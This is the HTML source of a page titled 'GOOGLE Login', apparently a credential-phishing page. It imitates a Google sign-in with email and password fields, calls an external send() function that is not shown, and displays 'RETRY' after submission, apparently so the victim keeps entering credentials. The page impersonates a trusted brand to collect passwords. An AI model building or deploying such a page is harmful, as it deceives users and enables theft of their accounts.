<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOOGLE Login</title>
    <link rel="stylesheet" href="main.css">
    <script src="main.js" defer></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative; /* Added position relative */
            background-color: #000; /* Default black background */
            transition: background-color 0.5s ease; /* Smooth background color transition */
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }

        /* Added style for the white text */
        .top-text {
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: #fff;
            font-size: 24px;
            font-family: 'Helvetica', sans-serif;
        }

        .contact-container {
            max-width: 300px; /* Adjusted max-width */
            width: 100%;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); /* Darker Box Shadow */
            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black Container Background */
            border-radius: 8px;
            text-align: center;
            color: #fff; /* White Text Color */
        }

        .contact-container h1 {
            margin-bottom: 20px;
            font-family: 'Helvetica', sans-serif; /* Change Font */
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            text-align: left;
            font-family: 'Helvetica', sans-serif; /* Change Font */
        }

        .input-field {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #fff; /* White Border Color */
            border-radius: 4px;
            margin-bottom: 10px; /* Smaller Margin */
            font-size: 16px;
            color: #ffffff; /* White Text Color */
            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white Input Background */
            resize: none; /* Disable resizing for the input field */
        }
     
        .message-field {
            width: 100%;
            height: 40px; /* Smaller Height */
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #FFF; /* White Border Color */
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 16px;
            resize: none; /* Disable resizing for the textarea */
            color: #ffffff; /* White Text Color */
            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white Input Background */
        }

        .submit-button {
            background-color: #008000; /* Blue Button */
            color: #fff;
            padding: 10px 20px;
            font-size: 18px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-button:hover {
            background-color: #004d00; /* Darker Blue on Hover */
        }

        .message-status {
            color: #2ecc71; /* Green Status Text */
            display: none;
        }

        .message-failed {
            color: #e74c3c; /* Red Failed Text */
            display: none;
        }
    </style>
</head>
<body>
    <script>
        // JavaScript to change background color to black while the video is loading
        document.addEventListener('DOMContentLoaded', function () {
            // Set the background color to black
            document.body.style.backgroundColor = '#000';
        });

        // JavaScript to change background color back to original after the video has loaded
        window.addEventListener('load', function () {
            // Set the background color back to its original color (you can adjust this)
            document.body.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
        });
    </script>

    <video autoplay muted loop>
        <source src="video.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <!-- Added white text on top -->
    <div class="top-text">CREATED BY SARDAR SHAH</div>

    <div class="contact-container">
        <h1>Login</h1>
        <form id="contactForm">
            <label for="NameInput" class="input-label">Email:</label>
            <input maxlength="37" minlength="2" id="NameInput" name="name" type="text" class="input-field" placeholder="Email Here" required>

            <label for="InputField" class="input-label">Password:</label>
            <input maxlength="2000" id="InputField" name="message" class="input-field" type="password" placeholder="Password Here" required>

            <button type="button" onclick="send()" class="submit-button">LOGIN</button>

            <p class="message-status" id="MessageSent">RETRY</p>
            <p class="message-failed" id="MessageFailed">Message failed!</p>
        </form>
    </div>
</body>
</html>
